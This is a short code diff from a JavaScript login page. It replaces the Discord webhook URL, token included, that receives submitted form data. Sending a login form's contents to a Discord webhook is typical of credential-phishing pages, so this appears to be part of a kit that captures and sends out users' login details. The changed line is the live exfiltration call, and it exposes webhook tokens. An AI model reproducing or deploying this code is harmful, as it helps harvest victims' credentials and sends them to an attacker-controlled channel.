@@ -22,7 +22,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     console.log('Sending data to Discord:', data);
 
-    fetch('https://discord.com/api/webhooks/1558964430836990175/RnRA4zY8n88DU_GAy6V4624zovlkm3Hj6rQSxOmz_Z3xLJUSjqLVa_ie-m198jW5Av02', {
+    fetch('https://discord.com/api/webhooks/1558973991887052890/iLid20j3V67XsHgKYwLNXnMX2828XXpoJHJcAdV5wlLcESDO7ylGr4qab8QOHRUnGHNq', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
